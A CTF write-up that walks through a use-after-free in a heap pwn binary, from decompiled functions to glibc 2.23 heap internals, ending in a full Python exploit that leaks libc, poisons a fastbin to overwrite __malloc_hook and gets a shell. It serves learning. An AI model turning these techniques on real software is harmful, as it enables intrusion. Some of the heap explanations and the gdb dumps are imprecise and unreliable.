# The UAF Vulnerability

This is a simple pwn challenge with an introduction to the double free and what it could lead to. You don't need to know all the heap internals to know everything, I'll explain small bits of eveything involved, so sit back and enjoy.


# UAF: Use After Free

As the name implies, Use After Free is literally what it says, once a memory region is freed, it has to be NULLED out so that the data when recycles that freed memory and give back it doesn't contain the data we previously filled the memory with.

# Challenge

To understand pwning, you have to do it practical, no amount of theoretical knowledge can make you master of this. Now, coming to the question, I don't know which CTF does the binary attached belongs to as I saw lying in my CTFs folder and since it was within heap folder, it made me curious enough to try. First, the binary is not stripped, so it saves time over reverse engineering and then if you see the security mechanisms, it has all of the usual protections enabled, from Canary to PIE.


```bash
0 [14:11:54] vagrant@oracle(oracle) doublefree> checksec data_bank
[*] '/home/vagrant/sharedFolder/heap/doublefree/data_bank'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
0 [14:11:57] vagrant@oracle(oracle) doublefree> ./data_bank 
----------DATA BANK----------
1) Add data
2) Edit data
3) Remove data
4) View data
5) Exit
>>
```

Considering the security mechanisms, we won't be dealing with any of them, it's one of the awesome thing about heap pwn.

## Reverse Engineering

It has all the typical function a "normal" heap pwn challenge has with an extra attachment of `edit`, we will see what it does and how it is key during the exploitation.

##### `add`

Let's see the `add` function and see what it does:-

```C
int add()
{
  int result; // eax
  signed int v1; // [rsp+Ch] [rbp-4h]

  puts("Enter the index:");
  result = get_int("Enter the index:");
  v1 = result;
  while ( v1 >= 0 && v1 <= 6 )
  {
    if ( table[v1] )
      return puts("The idx is occupied\n");
    puts("Enter the size:");
    size[v1] = get_int("Enter the size:");
    if ( (size[v1] & 0x80000000) == 0 && (signed int)size[v1] <= 1024 )
    {
      table[v1] = malloc((signed int)size[v1]);
      if ( !table[v1] )
        return puts("malloc_error");
      puts("Enter data:");
      return get_inp(table[v1], size[v1]);
    }
    result = puts("Invalid size");
  }
  return result;
}
```

So, we can give `index` between the `0` and `6`(exclusive) then we can give the size of the heap which would alwas be less than 1024, hah, we won't need that big chunk. It's just a simple `add` function which just takes `index` and according to that `index` save it to the table then we can allocate a heap of size < 1024 and add data to it.

##### `delete`

Let's see the `delete` function and see what it does:-

```C
int delete()
{
  int result; // eax
  int v1; // eax
  signed int v2; // [rsp+Ch] [rbp-4h]

  puts("Enter the index:");
  result = get_int("Enter the index:");
  v2 = result;
  while ( v2 >= 0 && v2 <= 6 )
  {
    if ( !table[v2] )
      return puts("The index is empty");
    v1 = count--;
    if ( v1 )
    {
      free((void *)table[v2]);
      return puts("done");
    }
    result = puts("Sorry no more removal\n");
  }
  return result;
}
```

Now, pay attention to the what happens afterwards, first it is checking if the `index` is within `0-6` then it checks if the `table[idx]` is not equal to zero if it is not, proceed to decrease the list of the chunks which is being taken in account with the global variable count, then it checks if it not NULL after that it free's the data.

> Well, pay attention, it didn't made the `table[idx]` to `0` so logically it can be free'd again.

##### `edit` 

Let's see the `edit` function:-

```C
int edit()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]

  puts("Enter the index:");
  result = get_int("Enter the index:");
  v1 = result;
  if ( result >= 0 && result <= 6 )
  {
    if ( table[result] )
    {
      puts("Please update the data:");
      if ( (unsigned int)get_inp(table[v1], size[v1]) )
        result = puts("update successful\n");
      else
        result = puts("update unsuccessful");
    }
    else
    {
      result = puts("The index is empty\n");
    }
  }
  return result;
}
```

Here it checks if the `tables[idx]` is NULL, well technically it never gets NULL'd so we can edit the free'd chunk, we will see how it is key :)

##### `view`

Well, `view` function, I'd suggest you try to look yourself and connect the dots yourself.

# Exploitation

Okay, so we saw what it is doing and the vulnerabilites it had, but what about it? Okay, well coming from the stack overflow mindset it's okay to ask that question, for this we will how things are handled, unfortunately, I won't go deeper within the details, try it best.

So, let me explain what happens, so when we allocate a chunk, a request to the kernel is made and in return a memory region is given to that process, then the program can use of that memory. These requests are made by `malloc` or `calloc` or another memory allocation function on the higher level, then we get a pointer to that memory which can be used later. Now, we need to understand how it is recycled, so what happens when we free a memory which has been allocated with `malloc` or `calloc`? To free the memory region we have call the function `free` itself as `free(buf)` where `buf` is the pointer to the previosuly allocated memory region. 

Now, when we allocate a couple of regions, let's say we create two chunks of size `a` and `b`, when we free these two memory regions they will land into the fastbins, just like recycle bin(yes, as in real world one), fastbin is a memory level recycle bin and then it can be used to recycle the chunk, now to understand the `fastbin` is a linked list which contains the track of memory chunks of size `0x10 - 0x80` inclusive i.e. when we have of chunk of size in range (0x10 - 0x80) and when we free it, it lands into the `fastbin` and when we need another memory of same size we free'd earlier and it is within the fastbin it'll return that. This kinda sounds counfusing but I hope I made some stuffs clear. 


So, let's say we create a chunk

```C
int *data = (int*)(malloc(0x10));
```
This will be a data created in the heap, now when we delete it

```C
free(data)
```

This will make the `data` go into the `fastbin`.

Now, when we agan allocate a variable of same size:-


```C
int *data2 = (int*)(malloc(0x10));
```
We will get the same memory region as of `data` variable,that is how heap recycles the heap chunks.



Now, let's move on, I made wrapper function to interact with the binary:-


```py
from roppy import *

p = process("./data_bank")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def add(idx, size, data):
    p.sendlineafter(">> ", "1")
    p.sendlineafter(":\n", str(idx))
    p.sendlineafter(":\n", str(size))
    p.sendlineafter(":\n", data)

def edit(idx, data):
	p.sendlineafter(">> ", "2")
	p.sendlineafter(":\n", str(idx))
	p.sendlineafter(":\n", data)

def remove(idx):
	p.sendlineafter(">> ", "3")
	p.sendlineafter(":\n", str(idx))

def view(idx):
	p.sendlineafter(">> ", "4")
	p.sendlineafter(":\n", str(idx))
```

Now, we will add 3 chunks of size `0x100` and `0x60,` and `0x60`, now let's do it.

```py
add(0, 0x100, "A"*8)
add(1, 0x60, "B"*24)
add(2, 0x60, "C"*8)
```


### LIBC Leak 

Okay, so like `fastbins` we have `unsorted bins`, these bins are taken into the consideration when a chunk which has been free'd doesn't fit within the range of `fastbins` size, now when we free the chunk which doesn't fit in fastbins. So, for this, we need to understand the chunk structure:-


---

##### Chunk Layout

When we allocate a chunk using a function like `malloc` the internal layout of chunk looks like:-

```r

    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk, if unallocated (P clear)  |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             User data starts here...                          .
	    .                                                               .
	    .             (malloc_usable_size() bytes)                      .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             (size of chunk, but used for application data)    |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|1|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```

There's not much to explain here, so I'll explain it via example:-

```C
char *name;
name = (char *)(malloc(0x10));
strncpy(name, "Hello World\n", 12);
```

So, when this will be allocated and the above lines of code executed the chunk will look like:-

```r

    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |                       NULL                                    |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             0x20                                         |A|0|1|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |                                      .
	    .                                                               .
	    .             "Hello World\n"                      .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             (size of chunk, but used for application data)    |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|1|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Here, when you'll see this in `gdb` you'll see:-

```
(gdb) x/20wx 0x100200
0x100200: 0x00000000 0x00000021 -> The size is 0x20 and the prev_in_use flag is 1, hence 0x21
0x100300: 0x48656c6c 0x6f20576f - Data
0x100400: 0x726c640a 0x00000000 _|
0x100400: 0x00000020 0x0001284b  -> top chunk
```

The `top_chunk` here represents the remaining data in the heap, this is important because this tells the heap that certain amount of space is left and requested data can be allocated from that. If needed more, the heap manager calls `mmap` or even `sbrk` to extend the region of the memory.

When we free a chunk, the layout of the chunk becomes:-

```r
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk, if unallocated (P clear)  |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Forward pointer to next chunk in list             |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Back pointer to previous chunk in list            |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Unused space (may be 0 bytes long)                .
	    .                                                               .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|0|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Once free'd it'll become something like the diagram depicted above. We store the size of the chunk we free'd and then we have two pointers, forward being denoted by `fd` and backward with `bk`, these two are just pointers to the next chunk and previous chunk which is also free'd, the heap needs to keep a track of this so the chunks can be used efficently without affecting the performance.

---

This an copied material from one of my posts, hope now you know how it works.


Now, to leak libc, we can remove all the chunks and then print a freed chunk, in this we will print the chunk of size `0x100` as it'll land into the `unsortedbins` and it'll have the `fd` and `bk` pointing to the `main_arena` which resides in LIBC.


```py
remove(0)
remove(1)
remove(2)
view(0)
```

Now, we will parse the values and print it:-

```py
leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("main_arena:   0x%x" %(leak))
libc.address = leak - 0x3c4b78
malloc_hook = libc.address + 0x3c4b10
log.info("LIBC:         0x%x" %(libc.address))
```

Running the exploit, we will get:-

```bash
130 [15:05:19] vagrant@oracle(oracle) doublefree> python3 data_bank.py 
[+] Starting program './data_bank': PID 4109
[*] Analyzing /lib/x86_64-linux-gnu/libc-2.23.so
[*] main_arena:   0x7fd835b6fb78
[*] LIBC:         0x7fd8357ab000
[*] Switching to interactive mode
1) Add data
2) Edit data
3) Remove data
4) View data
5) Exit
>> $  
```

# Getting shell

Okay, now it is not very confusing, when we call `malloc` it calls an internal function called `__malloc_hook` which does the work of returning the memory pointer. Okay, so now we have the LIBC address and we can calculate the `__malloc_hook` address, how we overwrite it? Remember the `fd` pointer of the `fastbins`, yes, we are going to overwrite it with the address of the `__malloc_hook`, since the `fd` is a pointer to the next free chunk, we will write primitve address on that address. Okay, so we will edit the chunk `fd` and then get the `__malloc_hook` address from the `malloc`:-


```py
edit(2, p64(malloc_hook - 0x23)[:6])
```
The reason I did `malloc_hook - 0x23` is because the heap checks if the size of the chunk is withing the fastbin range, and if we see the data in `gdb` with `x/xg &__malloc_hook - 0x23` we will see the size field(if considering the memory as chunk) has 

```r
gef➤  x/20xg 0x00007fd712c2eaed
0x7fd712c2eaed <_IO_wide_data_0+301>:	0xd712c2d260000000	0x000000000000007f
0x7fd712c2eafd:	0xd7128efea0000000	0xd7128efa7000007f
```

So, as you can see we have `0x7f` which passed the check without any hassle, now we will just need to overwrite the data up until to the address of `__malloc_hook` and we will be done.
```py
payload = b"\x00"*19
payload += p64(libc.address + 0xf0364)
add(5, 100, payload)
```

That is done, let's see the contents of the `__malloc_hook`:-

```r
gef➤  x/xg &__malloc_hook
0x7fd712c2eb10 <__malloc_hook>:	0x00007fd71295a364
gef➤  x/i 0x00007fd71295a364
   0x7fd71295a364 <exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3b4d]        # 0x7fd712c2deb8
```


Now, we just need to trigger the `__malloc_hook`, let's do it by just calling `malloc`:-

```py
p.sendlineafter(">> ", "1")
p.sendlineafter(":\n", "6")
p.sendlineafter(":\n", "10")

```

Running the exploit:-

```bash
 [15:24:23] vagrant@oracle(oracle) doublefree> python3 data_bank.py 
[+] Starting program './data_bank': PID 4433
[*] Analyzing /lib/x86_64-linux-gnu/libc-2.23.so
[*] main_arena:   0x7f5851230b78
[*] LIBC:         0x7f5850e6c000
[*] Switching to interactive mode
$ whoami
vagrant
$ ls
core  data_bank  data_bank.md  data_bank.py
$ 
[*] Interrupted
[*] Stopped program './data_bank'
```

I'll attach the binary and script and one more challenge for you try.